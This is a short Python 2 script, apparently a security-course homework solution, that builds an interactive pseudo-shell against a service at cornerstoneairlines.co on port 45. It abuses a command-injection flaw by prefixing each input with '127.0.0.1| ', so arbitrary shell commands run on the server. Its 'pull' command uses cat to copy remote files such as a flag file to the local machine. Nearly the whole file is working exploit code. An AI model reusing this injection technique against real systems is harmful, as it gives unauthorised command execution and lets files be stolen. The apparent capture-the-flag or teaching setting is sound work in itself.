"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()
    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here



def execute_cmd(cmd):
    """ 
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    arr=cmd.split();
    if arr[0] == "pull": 
        cmd= "127.0.0.1| cat "+arr[1]
    else :
        cmd = "127.0.0.1| " + cmd;

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024);
    s.send(cmd + "\n")
    result = s.recv(1024);
    if(arr[0]=="pull"):
        file1= open(arr[2],"w+")
        file1.write(result)
        file1.close();
    else :
        print result

    if not len(result) : 
        print "no response"
        s.close;

    


if __name__ == '__main__':
    while True:
        cmdf = raw_input("(py-shell) $ ");
        if cmdf == "quit":
            break;
        if cmdf == "help":
            print   "\npull <remote-path> <local-path> Download files ex. pull /home/flag.txt /root/flag.txt"
            print   "help Shows this help menu"
            print   "quit Quit the shell\n"
        else :
            execute_cmd(cmdf);
        
